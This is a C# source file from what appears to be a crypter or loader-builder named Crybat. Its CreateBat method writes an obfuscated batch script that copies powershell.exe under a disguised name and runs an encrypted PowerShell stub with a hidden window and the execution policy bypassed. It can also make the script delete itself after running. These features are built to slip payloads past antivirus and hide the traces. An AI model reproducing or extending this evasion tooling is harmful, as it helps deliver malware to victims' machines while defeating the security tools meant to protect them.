using System;
using System.Text;

namespace Crybat
{
    public class FileGen
    {
        public static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, Random rng)
        {
            string command = StubGen.CreatePS(key, iv, mode, rng);
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");

            (string, string) obfuscated = Obfuscator.GenCodeBat(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y ", rng, 4);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine(obfuscated.Item2 + "\"%~dp0%~nx0.exe\"");

            output.AppendLine("cls");
            obfuscated = Obfuscator.GenCodeBat("cd %~dp0", rng, 4);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine(obfuscated.Item2);

            string commandstart = $"-noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ";
            obfuscated = Obfuscator.GenCodeBat(commandstart + command, rng, 3);
            output.AppendLine(obfuscated.Item1);
            output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2);

            if (selfdelete) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
            output.AppendLine("exit /b");
            return output.ToString();
        }
    }
}
